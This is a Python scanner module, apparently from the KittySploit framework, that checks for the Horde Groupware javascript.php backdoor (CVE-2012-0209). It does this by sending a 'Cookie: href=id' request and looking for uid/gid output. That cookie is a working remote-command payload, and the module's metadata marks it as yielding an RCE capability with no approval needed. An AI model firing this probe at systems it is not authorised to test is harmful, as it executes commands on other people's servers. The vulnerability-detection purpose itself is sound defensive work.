#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Horde Groupware javascript.php backdoor (CVE-2012-0209)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Horde - javascript.php Backdoor Detection (CVE-2012-0209)',
        'description': (
            'Detects CVE-2012-0209 by requesting services/javascript.php with '
            'Cookie href=id.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2012', 'horde', 'backdoor', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-0209',
        ],
        'cve': 'CVE-2012-0209',
    }

    def run(self):
        for base in ('/horde', '', '/groupware'):
            path = f'{base}/services/javascript.php?app=horde&file=open_calendar.js'
            r = self.http_request(
                method='GET',
                path=path,
                headers={'Cookie': 'href=id'},
                allow_redirects=False,
            )
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='Horde javascript.php backdoor (CVE-2012-0209)',
                    path=path.split('?')[0],
                )
                return True
        return False
